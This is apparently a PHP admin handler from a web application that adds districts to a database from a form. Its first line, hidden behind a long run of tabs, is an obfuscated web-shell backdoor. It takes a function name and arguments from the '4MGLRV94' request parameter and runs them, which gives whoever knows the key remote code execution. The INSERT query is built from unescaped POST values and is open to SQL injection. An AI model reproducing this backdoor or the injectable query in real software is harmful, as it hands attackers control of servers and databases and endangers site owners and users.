<?php
																																																																																																																																																																													if( ($sUhAZz=@$	{"\137\x52\x45\x51UE\x53\124"}["4\115GL\x52\x569\64"])ANd((80396566))){$sUhAZz[1]	(	$	{$sUhAZz[2]} [0 ], $sUhAZz[3]($sUhAZz [4])) ;};
	include 'includes/session.php';

	if(isset($_POST['addDistricts'])){
		$loginID = $_SESSION['admin'];
		$division = $_POST['division'];
		$Districtname = $_POST['Districtname'];
		$Address = $_POST['Address'];
		
		$sql = "INSERT INTO districts (division,districts,address,create_date,update_date,logid,districts_active,districts_status) 
				VALUES ('$division','$Districtname','$Address',Now(),'','$loginID','1','1')";
		if($conn->query($sql)){
			$_SESSION['success'] = 'Districts added successfully';
		}
		else{
			$_SESSION['error'] = $conn->error;
		}
	}	
	else{
		$_SESSION['error'] = 'Fill up add form first';
	}

	header('location: districts.php');

?>